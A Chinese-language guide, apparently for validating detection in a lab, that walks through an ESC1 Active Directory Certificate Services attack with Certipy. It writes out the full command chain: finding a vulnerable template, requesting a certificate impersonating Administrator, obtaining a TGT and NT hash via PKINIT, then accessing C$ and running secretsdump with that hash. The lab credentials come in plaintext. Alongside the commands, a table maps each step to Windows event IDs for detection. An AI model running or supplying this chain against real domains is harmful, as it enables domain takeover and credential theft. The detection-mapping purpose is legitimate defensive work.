# Kali Certipy ESC1 驗證指南

## 概述

本指南使用 Certipy 單一工具完成 ESC1 攻擊鏈驗證，取代傳統的多工具複雜方法。

## 環境需求

- Kali Linux
- Python 3
- Certipy: `pip3 install certipy-ad`
- Proxychains (可選，用於代理環境)

## 完整的 ESC1 攻擊鏈

### 1. 列舉漏洞範本

```bash
proxychains certipy find -u 'aduser@sme.local' -p 'N0viru$123' -dc-ip 10.0.0.206
```

**預期輸出：**
- 找到 ESC1 範本，確認 `Enrollee Supplies Subject: True`
- 確認 `Client Authentication: True`
- 確認範本已啟用且不需要管理員批准

### 2. 請求惡意憑證

```bash
proxychains certipy req \
  -u 'aduser@sme.local' \
  -p 'N0viru$123' \
  -dc-ip 10.0.0.206 \
  -target 10.0.1.132 \
  -ca 'SME-SWP-CS' \
  -template 'ESC1' \
  -upn 'Administrator@sme.local'
```

**成功指標：**
- Request ID (如: 18)
- 自動儲存為 `administrator.pfx`
- UPN 正確設定為 `Administrator@sme.local`

### 3. PKINIT 認證取得 TGT

```bash
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.0.0.206
```

**成功指標：**
- 取得 Administrator TGT
- 自動儲存 Kerberos 票據為 `administrator.ccache`
- 取得 Administrator NT Hash

### 4. 驗證高權限存取

```bash
# 使用 Kerberos 票據存取
proxychains smbclient //10.0.0.206/c$ -k -c 'ls'

# 或使用 NT Hash 進行域控制
proxychains secretsdump.py -hashes :afe3865b7dfdbc06b2712d73224415b8 administrator@10.0.0.206
```

## 事件產生對照表

| 步驟 | 工具指令 | 事件 ID | 關鍵偵測點 |
|------|----------|---------|------------|
| 列舉 | `certipy find` | 通常無 | N/A |
| 憑證請求 | `certipy req` | 4886, 4887 | Requester(aduser) vs Subject(Administrator) |
| PKINIT | `certipy auth` | 4768 | Certificate Information, TargetUserName=Administrator |
| 資源存取 | `smbclient -k` | 4624, 5140 | Logon Type 3, 高權限存取 |

## 疑難排解

### 常見錯誤

1. **Web Enrollment 錯誤**: 不影響核心 RPC 功能
2. **SID 警告**: 不影響 PKINIT 功能
3. **時間同步**: 確保 Kerberos 時間偏差在 5 分鐘內

### 成功驗證點

- ✅ CA 事件 4886/4887 顯示 Request ID 和申請者資訊
- ✅ DC 事件 4768 顯示 PKINIT 認證和憑證資訊
- ✅ 成功取得 Administrator TGT 和 NT Hash
- ✅ 可存取高權限資源

## Certipy 優勢

### 對比傳統方法

**傳統方法 (複雜):**
- Certify + Rubeus + secretsdump + 手動檔案管理
- 多工具參數記憶和格式轉換
- 容易出錯的複雜流程

**Certipy 方法 (簡潔):**
- 單一工具處理完整攻擊鏈
- 自動檔案命名和格式處理
- 清晰的錯誤處理和進度指示

### 好品味設計體現

1. **自動化**: 根據 UPN 自動命名輸出檔案
2. **智能處理**: 自動解析憑證和提取身份資訊
3. **完整覆蓋**: 從列舉到域控制的完整權限提升
4. **錯誤恢復**: 清晰的錯誤訊息和恢復機制

## 總結

Certipy 提供了一站式的 ESC1 驗證解決方案，消除了傳統多工具方法的複雜性。透過單一工具完成從低權限到完全域控制的完整攻擊鏈，大幅簡化了驗證流程並提高了可靠性。

## 參考資源

- [Certipy GitHub](https://github.com/ly4k/Certipy)
- ESC1 漏洞詳細說明
- AD CS 安全最佳實踐